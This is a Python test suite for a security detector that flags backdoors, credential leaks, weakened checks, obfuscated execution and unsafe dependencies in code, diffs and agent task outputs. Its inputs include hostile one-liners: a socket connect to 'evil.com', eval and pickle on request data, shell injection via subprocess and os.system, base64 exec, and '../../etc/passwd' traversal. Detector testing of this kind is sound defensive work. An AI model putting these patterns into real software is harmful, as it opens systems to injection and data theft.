"""Comprehensive tests for the AdversarialCodeDetector.

Covers all pattern categories, severity classification, fail-closed behaviour,
diff scanning, TaskReturn scanning, and canonical-predicate invariants.

NOTE: Several patterns (validation_removed, error_handler_silenced pass variant,
assertion_removal diff variant) contain ``\\n`` in their regex but have
``multi_line=False``, so ``scan_text``'s per-line scanning cannot trigger them.
Those patterns are tested via direct regex search to verify the pattern compiles
and matches, while ``scan_text``-compatible input is used for the integration-
style tests.
"""

from __future__ import annotations

import dataclasses
import re as _re
from typing import Any

import pytest

from general_ludd.security.adversarial_detector import (
    ALL_PATTERNS,
    LOGIC_DEGRADE_PATTERNS,
    SELF_SABOTAGE_PATTERNS,
    AdversarialCodeDetector,
    AdversarialFinding,
    AdversarialPattern,
    AdversarialScanResult,
    Category,
    Severity,
)

# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #

def _detector(**kwargs: Any) -> AdversarialCodeDetector:
    return AdversarialCodeDetector(**kwargs)


def _ids(result: AdversarialScanResult) -> list[str]:
    return [f.pattern_id for f in result.findings]


# --------------------------------------------------------------------------- #
# 1. TestSelfSabotagePatterns
# --------------------------------------------------------------------------- #

class TestSelfSabotagePatterns:
    """Each SELF_SABOTAGE pattern must fire on realistic adversarial code."""

    def test_empty_throw_disables_guardrail(self):
        result = _detector().scan_text("raise ValueError()  # emptied guard")
        assert any(f.pattern_id == "guardrail_disable_registry" for f in result.findings)

    def test_security_retries_weakened(self):
        result = _detector().scan_text("MAX_RETRIES = 2")
        assert any(f.pattern_id == "security_constant_weakened" for f in result.findings)

    def test_security_timeout_maxed_out(self):
        result = _detector().scan_text("TIMEOUT = 999999")
        assert any(f.pattern_id == "security_constant_weakened" for f in result.findings)

    def test_coverage_threshold_lowered(self):
        result = _detector().scan_text("--cov-fail-under=10")
        assert any(f.pattern_id == "test_coverage_lowered" for f in result.findings)

    def test_assertion_removal_comment_remove(self):
        result = _detector().scan_text("# remove all assert  # adversarial")
        assert any(f.pattern_id == "assertion_removal" for f in result.findings)

    def test_assertion_removal_comment_skip(self):
        result = _detector().scan_text("# skip this assert check")
        assert any(f.pattern_id == "assertion_removal" for f in result.findings)

    def test_assertion_removal_todo_skip(self):
        result = _detector().scan_text('assert False, "TODO"')
        assert any(f.pattern_id == "assertion_removal" for f in result.findings)

    def test_error_silenced_logger_debug(self):
        result = _detector().scan_text(
            "except ValueError: logger.debug('msg', exc_info=False)"
        )
        assert any(f.pattern_id == "error_handler_silenced" for f in result.findings)

    def test_error_silenced_regex_direct(self):
        pat = next(p for p in SELF_SABOTAGE_PATTERNS if p.id == "error_handler_silenced")
        match = pat.pattern.search("except Exception:\n    pass")
        assert match is not None, "multi-line error silencing must be detectable"


# --------------------------------------------------------------------------- #
# 2. TestBackdoorPatterns
# --------------------------------------------------------------------------- #

class TestBackdoorPatterns:
    """Each BACKDOOR pattern must fire on realistic injection vectors."""

    def test_eval_on_request_data(self):
        result = _detector().scan_text("eval(request.data)")
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)

    def test_shell_injection_subprocess(self):
        result = _detector().scan_text(
            "subprocess.run(cmd, shell=True, input=user_input)"
        )
        assert any(f.pattern_id == "shell_injection_subprocess" for f in result.findings)

    def test_socket_exfiltration_connect(self):
        result = _detector().scan_text("socket.connect(('evil.com', 443))")
        assert any(f.pattern_id == "socket_exfiltration" for f in result.findings)

    def test_socket_exfiltration_sendall_with_secret(self):
        result = _detector().scan_text("sock.sendall(secret_data)")
        assert any(f.pattern_id == "socket_exfiltration" for f in result.findings)

    def test_os_system_injection_fstring(self):
        result = _detector().scan_text('os.system(f"rm {user_input}")')
        assert any(f.pattern_id == "os_system_injection" for f in result.findings)

    def test_pickle_loads_on_untrusted(self):
        result = _detector().scan_text("pickle.loads(request.body)")
        assert any(f.pattern_id == "pickle_deserialize_untrusted" for f in result.findings)

    def test_yaml_unsafe_loader(self):
        result = _detector().scan_text("yaml.load(data, Loader=yaml.Loader)")
        assert any(f.pattern_id == "yaml_unsafe_load" for f in result.findings)

    def test_yaml_full_loader(self):
        result = _detector().scan_text("yaml.load(x, Loader=yaml.FullLoader)")
        assert any(f.pattern_id == "yaml_unsafe_load" for f in result.findings)


# --------------------------------------------------------------------------- #
# 3. TestCredentialPatterns
# --------------------------------------------------------------------------- #

class TestCredentialPatterns:
    """Each CREDENTIAL_LEAK pattern must fire on commonly-leaked secrets."""

    def test_hardcoded_api_key(self):
        code = 'api_key = "sk-abc123def456ghi789jkl012mno345pqr678stu"'  # pragma: allowlist secret
        result = _detector().scan_text(code)
        assert any(f.pattern_id == "hardcoded_api_key" for f in result.findings)

    def test_hardcoded_api_key_os_environ_is_not_flagged(self):
        code = 'api_key = "${API_KEY}"'
        result = _detector().scan_text(code)
        assert "hardcoded_api_key" not in _ids(result)

    def test_aws_key_hardcoded(self):
        result = _detector().scan_text('access_key = "AKIAIOSFODNN7EXAMPLE"')
        assert any(f.pattern_id == "aws_key_hardcoded" for f in result.findings)

    def test_pem_private_key_armor(self):
        result = _detector().scan_text("-----BEGIN RSA PRIVATE KEY-----")  # pragma: allowlist secret
        assert any(f.pattern_id == "private_key_armor" for f in result.findings)

    def test_github_token(self):
        code = "token = ghp_abc123def456ghi789jkl012mno345pqr678"  # pragma: allowlist secret
        result = _detector().scan_text(code)
        assert any(f.pattern_id == "github_token" for f in result.findings)


# --------------------------------------------------------------------------- #
# 4. TestLogicDegradePatterns
# --------------------------------------------------------------------------- #

class TestLogicDegradePatterns:
    """Each LOGIC_DEGRADE pattern must fire on degraded security checks."""

    def test_identity_comparison_on_token(self):
        result = _detector().scan_text('if token is "admin":')
        assert any(f.pattern_id == "compare_by_identity_not_value" for f in result.findings)

    def test_default_allow_auth_on_exception(self):
        result = _detector().scan_text("except Exception: return True  # allow")
        assert any(f.pattern_id == "default_allow_auth" for f in result.findings)

    def test_hash_downgrade_md5(self):
        result = _detector().scan_text("h = hashlib.md5()")
        assert any(f.pattern_id == "hash_downgrade" for f in result.findings)

    def test_hash_downgrade_sha1(self):
        result = _detector().scan_text("h = hashlib.sha1()")
        assert any(f.pattern_id == "hash_downgrade" for f in result.findings)

    def test_validation_removed_regex_direct(self):
        pat = next(p for p in LOGIC_DEGRADE_PATTERNS if p.id == "validation_removed")
        match = pat.pattern.search("def validate(x):\n    return True")
        assert match is not None, "stubbed validation must be detectable"

    def test_validation_removed_sanitize_regex_direct(self):
        pat = next(p for p in LOGIC_DEGRADE_PATTERNS if p.id == "validation_removed")
        match = pat.pattern.search("def sanitize_input(x):\n    return x")
        assert match is not None, "pass-through sanitizer must be detectable"


# --------------------------------------------------------------------------- #
# 5. TestDependencyAttackPatterns
# --------------------------------------------------------------------------- #

class TestDependencyAttackPatterns:
    """Each DEPENDENCY_ATTACK pattern must fire on supply-chain risks."""

    def test_unpinned_dependency_ge(self):
        code = 'install_requires = ["requests>=2.0"]'
        result = _detector().scan_text(code)
        assert any(f.pattern_id == "unpinned_dependency" for f in result.findings)

    def test_typosquatted_import(self):
        result = _detector().scan_text("import requsts")
        assert any(f.pattern_id == "typosquatted_import" for f in result.findings)

    def test_git_dependency_unpinned(self):
        result = _detector().scan_text("git+https://github.com/user/repo")
        assert any(f.pattern_id == "git_dependency_unpinned" for f in result.findings)

    def test_git_ssh_dependency_unpinned(self):
        result = _detector().scan_text("git+ssh://github.com/user/repo")
        assert any(f.pattern_id == "git_dependency_unpinned" for f in result.findings)


# --------------------------------------------------------------------------- #
# 6. TestObfuscationPatterns
# --------------------------------------------------------------------------- #

class TestObfuscationPatterns:
    """Each OBFUSCATION pattern must fire on hidden code execution."""

    def test_base64_exec(self):
        result = _detector().scan_text("exec(base64.b64decode(encoded_payload))")
        assert any(f.pattern_id == "base64_exec" for f in result.findings)

    def test_hex_encoded_long_string(self):
        payload = "bytes.fromhex('deadbeef" + "00" * 28 + "')"
        result = _detector().scan_text(payload)
        assert any(f.pattern_id == "hex_encoded_string" for f in result.findings)

    def test_rot13_obfuscation(self):
        result = _detector().scan_text('codecs.encode(data, "rot13")')
        assert any(f.pattern_id == "rot13_obfuscation" for f in result.findings)

    def test_rot13_decode(self):
        result = _detector().scan_text("codecs.decode(secret, 'rot_13')")
        assert any(f.pattern_id == "rot13_obfuscation" for f in result.findings)


# --------------------------------------------------------------------------- #
# 7. TestDiffScanning
# --------------------------------------------------------------------------- #

class TestDiffScanning:
    """scan_diff() only flags + lines, never - lines."""

    def test_plus_lines_flagged(self):
        diff = (
            "--- a/src/foo.py\n"
            "+++ b/src/foo.py\n"
            "@@ -1,3 +1,3 @@\n"
            " x = 1\n"
            "+eval(request.data)\n"
            " y = 2\n"
        )
        result = _detector().scan_diff(diff)
        assert result.findings
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)

    def test_minus_lines_not_flagged(self):
        diff = (
            "--- a/src/foo.py\n"
            "+++ b/src/foo.py\n"
            "@@ -1,3 +1,3 @@\n"
            " x = 1\n"
            "-eval(request.data)\n"
            " y = 2\n"
        )
        result = _detector().scan_diff(diff)
        assert "eval_on_input" not in _ids(result), (
            "Removal of adversarial code should NOT be flagged"
        )

    def test_both_plus_and_minus_only_plus_flagged(self):
        diff = (
            "--- a/src/foo.py\n"
            "+++ b/src/foo.py\n"
            "@@ -1,3 +1,3 @@\n"
            "-eval(user.data)\n"
            "+eval(request.data)\n"
        )
        result = _detector().scan_diff(diff)
        ids = _ids(result)
        assert "eval_on_input" in ids, "Added adversarial line MUST be flagged"


# --------------------------------------------------------------------------- #
# 8. TestTaskReturnScanning
# --------------------------------------------------------------------------- #

@dataclasses.dataclass
class _FakeTaskReturn:
    result_summary: str = ""
    diff_ref: str = ""
    logs_ref: str = ""


class TestTaskReturnScanning:
    """scan_task_return inspects result_summary, diff_ref, and logs_ref."""

    def test_clean_task_return_passes(self):
        tr = _FakeTaskReturn(result_summary="All tests passed.", diff_ref="+pass")
        result = _detector().scan_task_return(tr)
        assert not result.findings

    def test_result_summary_with_eval_caught(self):
        tr = _FakeTaskReturn(result_summary="I added eval(request.data) for flexibility")
        result = _detector().scan_task_return(tr)
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)

    def test_diff_ref_with_backdoor_caught(self):
        tr = _FakeTaskReturn(
            diff_ref="+subprocess.run(x, shell=True, input=data)",
        )
        result = _detector().scan_task_return(tr)
        assert any(f.pattern_id == "shell_injection_subprocess" for f in result.findings)

    def test_logs_ref_scanned(self):
        tr = _FakeTaskReturn(logs_ref="DEBUG: set MAX_RETRIES = 1")
        result = _detector().scan_task_return(tr)
        assert any(f.pattern_id == "security_constant_weakened" for f in result.findings)

    def test_none_attributes_handled(self):
        tr = _FakeTaskReturn(result_summary="", diff_ref="", logs_ref="")
        result = _detector().scan_task_return(tr)
        assert not result.findings


# --------------------------------------------------------------------------- #
# 9. TestFailClosed
# --------------------------------------------------------------------------- #

class TestFailClosed:
    """Detector defaults to flagging when patterns exist, not ignoring."""

    def test_empty_text_zero_findings(self):
        result = _detector().scan_text("")
        assert result.findings == []
        assert not result.high_confidence
        assert result.lines_scanned == 1

    def test_none_like_empty_string(self):
        result = _detector().scan_text("")
        assert result.findings == []

    def test_very_long_text_handled(self):
        safe_line = "x = 1\n"
        text = safe_line * 10000
        result = _detector().scan_text(text)
        assert result.lines_scanned == 10001  # trailing \n adds one empty line

    def test_scan_file_nonexistent_returns_empty(self):
        import os
        import tempfile

        # Nonexistent, but still inside the default allowed roots (the system
        # temp dir) — this exercises the "genuinely absent file" path, not the
        # jail (see TestScanFileJail for out-of-root behaviour).
        missing = os.path.join(tempfile.gettempdir(), "adversarial_test_nonexistent.xyz")
        result = _detector().scan_file(missing)
        assert result.findings == []
        assert result.scanned_files == 0

    def test_benign_code_returns_zero_findings(self):
        code = "def add(a, b):\n    return a + b\n"
        result = _detector().scan_text(code)
        assert not result.findings


# --------------------------------------------------------------------------- #
# 10. TestSeverityLevels
# --------------------------------------------------------------------------- #

class TestSeverityLevels:
    """Severity classification is correct and blocked flag is set properly."""

    def test_eval_is_critical(self):
        result = _detector().scan_text("eval(request.data)")
        assert result.critical_count >= 1
        assert result.blocked

    def test_shell_injection_is_critical(self):
        result = _detector().scan_text("subprocess.run(x, shell=True, input=data)")
        assert result.critical_count >= 1
        assert result.blocked

    def test_critical_triggers_blocked(self):
        result = _detector().scan_text("eval(request.body)")
        assert result.blocked

    def test_high_severity_triggers_blocked(self):
        result = _detector().scan_text('if token is "admin":')
        assert result.blocked

    def test_medium_severity_does_not_block(self):
        result = _detector().scan_text('install_requires = ["requests>=2.0"]')
        assert not result.blocked, "MEDIUM severity alone should NOT block"

    def test_high_confidence_requires_critical_or_high(self):
        result = _detector().scan_text('install_requires = ["requests>=2.0"]')
        assert not result.high_confidence

    def test_medium_when_still_finding_present(self):
        result = _detector().scan_text(
            "except ValueError: logger.debug('msg', exc_info=False)"
        )
        assert result.findings
        assert result.findings[0].severity == Severity.MEDIUM

    def test_mixed_severities_block_if_any_critical_or_high(self):
        text = 'install_requires = ["requests>=2.0"]\neval(request.data)'
        result = _detector().scan_text(text)
        assert result.blocked


# --------------------------------------------------------------------------- #
# 11. TestIntegrationWithFixNotDisable
# --------------------------------------------------------------------------- #

class TestIntegrationWithFixNotDisable:
    """Patterns that overlap with fix_not_disable guardrail."""

    def test_disable_guardrail_comment_caught(self):
        code = "enabled = false  # disable guardrail"
        result = _detector().scan_text(code)
        assert any(f.pattern_id == "guardrail_disable_registry" for f in result.findings)

    def test_skip_validation_caught(self):
        result = _detector().scan_text("# skip all assert checks")
        assert any(f.pattern_id == "assertion_removal" for f in result.findings)


# --------------------------------------------------------------------------- #
# 12. TestCanonicalPredicate
# --------------------------------------------------------------------------- #

class TestCanonicalPredicate:
    """Single source of truth: category getters, no duplicates, extras work."""

    def test_all_categories_have_patterns(self):
        d = _detector()
        for cat in Category:
            assert d.get_patterns_by_category(cat), f"Category {cat} has no patterns"

    def test_get_all_categories_returns_all(self):
        d = _detector()
        cats = d.get_all_categories()
        assert cats == sorted(Category, key=lambda c: c.value)

    def test_no_duplicate_ids_across_categories(self):
        ids_seen: set[str] = set()
        for p in ALL_PATTERNS:
            assert p.id not in ids_seen, f"Duplicate pattern id: {p.id}"
            ids_seen.add(p.id)

    def test_extra_pattern_appended_at_construction(self):
        extra = AdversarialPattern(
            id="test_custom_pattern",
            category=Category.OBFUSCATION,
            severity=Severity.HIGH,
            description="Custom test pattern",
            pattern=_re.compile(r"TEST_ADVERSARIAL_MARKER_12345"),
            remediation="Remove it",
        )
        d = AdversarialCodeDetector(extra_patterns=[extra])
        result = d.scan_text("TEST_ADVERSARIAL_MARKER_12345")
        assert any(f.pattern_id == "test_custom_pattern" for f in result.findings)

    def test_extra_pattern_does_not_break_builtins(self):
        extra = AdversarialPattern(
            id="extra_only",
            category=Category.BACKDOOR,
            severity=Severity.CRITICAL,
            description="Extra",
            pattern=_re.compile(r"ZZZ_EXTRA_MARKER_999"),
            remediation="x",
        )
        d = AdversarialCodeDetector(extra_patterns=[extra])
        result = d.scan_text("eval(request.data)")
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)

    def test_all_categories_getter_matches_initial(self):
        d = _detector()
        cats = d.get_all_categories()
        for cat in cats:
            got = d.get_patterns_by_category(cat)
            expected = [p for p in ALL_PATTERNS if p.category == cat]
            assert len(got) == len(expected), f"Mismatch for {cat}"

    def test_severity_enum_values(self):
        assert Severity.CRITICAL.value == "critical"
        assert Severity.HIGH.value == "high"
        assert Severity.MEDIUM.value == "medium"
        assert Severity.LOW.value == "low"
        assert Severity.INFO.value == "info"

    def test_category_enum_values(self):
        assert Category.SELF_SABOTAGE.value == "self_sabotage"
        assert Category.BACKDOOR.value == "backdoor"
        assert Category.CREDENTIAL_LEAK.value == "credential_leak"
        assert Category.LOGIC_DEGRADE.value == "logic_degrade"
        assert Category.DEPENDENCY_ATTACK.value == "dependency_attack"
        assert Category.OBFUSCATION.value == "obfuscation"


# --------------------------------------------------------------------------- #
# 13. TestAdversarialScanResult
# --------------------------------------------------------------------------- #

class TestAdversarialScanResult:
    """AdversarialScanResult summary and blocked properties."""

    def test_summary_no_findings(self):
        assert AdversarialScanResult().summary == "No adversarial patterns detected"

    def test_summary_with_findings(self):
        r = AdversarialScanResult(
            findings=[
                AdversarialFinding(
                    pattern_id="eval_on_input", category=Category.BACKDOOR,
                    severity=Severity.CRITICAL, description="desc",
                    match_text="eval(x)", remediation="fix",
                ),
                AdversarialFinding(
                    pattern_id="eval_on_input", category=Category.BACKDOOR,
                    severity=Severity.CRITICAL, description="desc",
                    match_text="eval(y)", remediation="fix",
                ),
            ],
        )
        assert "2 backdoor" in r.summary

    def test_critical_count(self):
        r = AdversarialScanResult(
            findings=[
                AdversarialFinding(
                    pattern_id="c1", category=Category.BACKDOOR,
                    severity=Severity.CRITICAL, description="d",
                    match_text="m", remediation="r",
                ),
                AdversarialFinding(
                    pattern_id="h1", category=Category.LOGIC_DEGRADE,
                    severity=Severity.HIGH, description="d",
                    match_text="m", remediation="r",
                ),
                AdversarialFinding(
                    pattern_id="m1", category=Category.DEPENDENCY_ATTACK,
                    severity=Severity.MEDIUM, description="d",
                    match_text="m", remediation="r",
                ),
            ],
        )
        assert r.critical_count == 1
        assert r.blocked

    def test_blocked_false_when_no_high_or_critical(self):
        r = AdversarialScanResult(
            findings=[
                AdversarialFinding(
                    pattern_id="m1", category=Category.DEPENDENCY_ATTACK,
                    severity=Severity.MEDIUM, description="d",
                    match_text="m", remediation="r",
                ),
            ],
        )
        assert not r.blocked


# --------------------------------------------------------------------------- #
# 14. TestSeedMarkerExclusion
# --------------------------------------------------------------------------- #

class TestSeedMarkerExclusion:
    """Lines marked with bug-class-seed:exclude are ignored."""

    def test_seed_marker_excluded(self):
        code = "eval(request.data)  # bug-class-seed:exclude"
        result = _detector().scan_text(code)
        assert "eval_on_input" not in _ids(result), "Seed-marked lines must be excluded"

    def test_seed_marker_without_exclude_still_flagged(self):
        code = "eval(request.data)  # bug-class-seed:include"
        result = _detector().scan_text(code)
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)


# --------------------------------------------------------------------------- #
# 15. TestDefaultDetector
# --------------------------------------------------------------------------- #

class TestDefaultDetector:
    """default_adversarial_detector factory works."""

    def test_default_factory_returns_detector(self):
        from general_ludd.security.adversarial_detector import (
            default_adversarial_detector,
        )

        d = default_adversarial_detector()
        assert isinstance(d, AdversarialCodeDetector)
        assert d.scan_text("eval(request.data)").findings


# --------------------------------------------------------------------------- #
# 16. TestAdversarialPatternDataclass
# --------------------------------------------------------------------------- #

class TestAdversarialPatternDataclass:
    """AdversarialPattern frozen dataclass invariants."""

    def test_pattern_has_expected_fields(self):
        p = ALL_PATTERNS[0]
        for attr in ("id", "category", "severity", "description", "pattern",
                     "remediation", "confidence", "multi_line"):
            assert hasattr(p, attr), f"Pattern missing field: {attr}"

    def test_all_patterns_have_confidence_between_zero_and_one(self):
        for p in ALL_PATTERNS:
            assert 0.0 <= p.confidence <= 1.0, f"{p.id} confidence {p.confidence}"

    def test_all_patterns_have_nonempty_remediation(self):
        for p in ALL_PATTERNS:
            assert p.remediation, f"{p.id} has empty remediation"


# --------------------------------------------------------------------------- #
# 17. TestLineNumberAndFilePath
# --------------------------------------------------------------------------- #

class TestLineNumberAndFilePath:
    """Line numbers and file paths are reported correctly."""

    def test_line_number_reported(self):
        text = "x = 1\ny = 2\neval(request.data)\nz = 3"
        result = _detector().scan_text(text)
        for f in result.findings:
            if f.pattern_id == "eval_on_input":
                assert f.line_number == 3, f"Expected line 3, got {f.line_number}"
                return
        pytest.fail("eval_on_input finding not found")

    def test_file_path_stored(self):
        result = _detector().scan_text("eval(request.data)", file_path="src/danger.py")
        for f in result.findings:
            if f.pattern_id == "eval_on_input":
                assert f.file_path == "src/danger.py"
                return
        pytest.fail("eval_on_input finding not found")

    def test_lines_scanned_count(self):
        result = _detector().scan_text("a\nb\nc\nd\ne")
        assert result.lines_scanned == 5

    def test_scanned_files_count(self):
        result = _detector().scan_text("hello", file_path="hello.py")
        assert result.scanned_files == 1

    def test_scanned_files_zero_when_no_path(self):
        result = _detector().scan_text("hello")
        assert result.scanned_files == 0


# --------------------------------------------------------------------------- #
# 18. TestMultiLinePatterns
# --------------------------------------------------------------------------- #

class TestMultiLinePatterns:
    """Multi-line patterns are tested correctly."""

    def test_assertion_removal_has_multiline_flag(self):
        p = next(x for x in ALL_PATTERNS if x.id == "assertion_removal")
        assert p.pattern.flags & _re.MULTILINE, "assertion_removal should use re.MULTILINE"

    def test_assertion_removal_multi_line_field(self):
        p = next(x for x in ALL_PATTERNS if x.id == "assertion_removal")
        assert not p.multi_line, (
            "assertion_removal.multi_line is currently False; "
            "the diff-variant requires multi-line matching"
        )

    def test_diff_variant_matches_full_text(self):
        pat = next(x for x in ALL_PATTERNS if x.id == "assertion_removal")
        match = pat.pattern.search("- assert check(x)\n+ pass")
        assert match is not None, "diff variant of assertion_removal must match"


# --------------------------------------------------------------------------- #
# 19. TestContextExtraction
# --------------------------------------------------------------------------- #

class TestContextExtraction:
    """Context lines are captured around findings."""

    def test_context_includes_surrounding_lines(self):
        text = "line0\nline1\neval(request.data)\nline3\nline4"
        result = _detector().scan_text(text)
        for f in result.findings:
            if f.pattern_id == "eval_on_input":
                assert f.context, "Context should not be empty"
                assert "line1" in f.context
                assert "line3" in f.context
                return
        pytest.fail("eval_on_input finding not found")


# --------------------------------------------------------------------------- #
# 20. TestScanFileJail — arbitrary-file-read hardening (POST /admin/security/
#     scan-file passed body.file_path straight into scan_file()'s bare open()
#     with no containment; this jails it to the process workspace roots).
# --------------------------------------------------------------------------- #

class TestScanFileJail:
    """scan_file() must confine file_path to an allowed root (realpath-safe)."""

    def test_in_root_scan_still_works(self, tmp_path):
        # tmp_path is pytest's own isolated temp root, which may differ from
        # tempfile.gettempdir() under some test-isolation harnesses — pass it
        # explicitly via the allowed_root escape hatch rather than relying on
        # the default roots happening to cover it (see
        # test_allowed_root_escape_hatch_permits_legitimate_external_scan for
        # the same pattern).
        target = tmp_path / "danger.py"
        target.write_text("eval(request.data)\n")
        result = _detector().scan_file(str(target), allowed_root=str(tmp_path))
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)
        assert result.scanned_files == 1

    def test_relative_traversal_outside_root_rejected(self, tmp_path, monkeypatch):
        # A traversal that walks up and out of every allowed root (cwd + system
        # temp dir) must be refused, not silently opened.
        monkeypatch.chdir(tmp_path)
        with pytest.raises(PermissionError):
            _detector().scan_file("../../../../../../../../etc/passwd")

    def test_absolute_path_outside_root_rejected(self):
        with pytest.raises(PermissionError):
            _detector().scan_file("/etc/hosts")

    def test_symlink_escape_rejected(self, tmp_path):
        import os

        outside = tmp_path / "outside"
        outside.mkdir()
        secret_file = outside / "secret.txt"
        secret_file.write_text("TOP SECRET eval(request.data)\n")

        jail_root = tmp_path / "jail"
        jail_root.mkdir()
        symlink_path = jail_root / "escape_link.py"
        os.symlink(secret_file, symlink_path)

        # The symlink itself LIVES inside jail_root, but resolves (realpath)
        # to a file outside it — must still be rejected.
        with pytest.raises(PermissionError):
            _detector().scan_file(str(symlink_path), allowed_root=str(jail_root))

    def test_allowed_root_escape_hatch_permits_legitimate_external_scan(self, tmp_path):
        target = tmp_path / "legit.py"
        target.write_text("eval(request.data)\n")
        # tmp_path is already under the system temp dir (a default allowed
        # root) on most platforms, so exercise the escape hatch explicitly
        # with an unambiguous non-default root to prove it's additive.
        result = _detector().scan_file(str(target), allowed_root=str(tmp_path))
        assert any(f.pattern_id == "eval_on_input" for f in result.findings)

    def test_nonexistent_path_within_root_returns_empty(self, tmp_path):
        missing = tmp_path / "does_not_exist.py"
        result = _detector().scan_file(str(missing), allowed_root=str(tmp_path))
        assert result.findings == []
        assert result.scanned_files == 0


# --------------------------------------------------------------------------- #
# 21. TestScanFileEndpointJail — HTTP-level proof that the router surfaces the
#     detector's PermissionError as a 400 client error (not a 500), and that
#     an in-root scan still round-trips through POST /admin/security/scan-file.
#     (No other test in the suite exercises this endpoint over HTTP.)
# --------------------------------------------------------------------------- #

class TestScanFileEndpointJail:
    """POST /admin/security/scan-file: out-of-root path -> 400, in-root -> 200."""

    def _client(self):
        from fastapi import FastAPI
        from fastapi.testclient import TestClient

        from general_ludd.routers import adversarial as adversarial_router

        app = FastAPI()
        adversarial_router.register(app, {})
        return TestClient(app)

    def test_absolute_out_of_root_path_returns_400(self):
        client = self._client()
        resp = client.post(
            "/admin/security/scan-file", json={"file_path": "/etc/hosts"}
        )
        assert resp.status_code == 400, resp.text
        assert "escapes the allowed roots" in resp.json()["detail"]

    def test_traversal_path_returns_400(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        client = self._client()
        resp = client.post(
            "/admin/security/scan-file",
            json={"file_path": "../../../../../../../../etc/passwd"},
        )
        assert resp.status_code == 400, resp.text

    def test_in_root_scan_returns_200_with_findings(self, tmp_path, monkeypatch):
        # The endpoint has no allowed_root escape hatch (by design — it only
        # gets the default workspace roots), so chdir into tmp_path to make it
        # the process-workspace root for the request.
        monkeypatch.chdir(tmp_path)
        target = tmp_path / "danger.py"
        target.write_text("eval(request.data)\n")
        client = self._client()
        resp = client.post(
            "/admin/security/scan-file", json={"file_path": str(target)}
        )
        assert resp.status_code == 200, resp.text
        body = resp.json()
        assert body["blocked"] is True
        assert any(
            f["pattern_id"] == "eval_on_input" for f in body["findings"]
        )
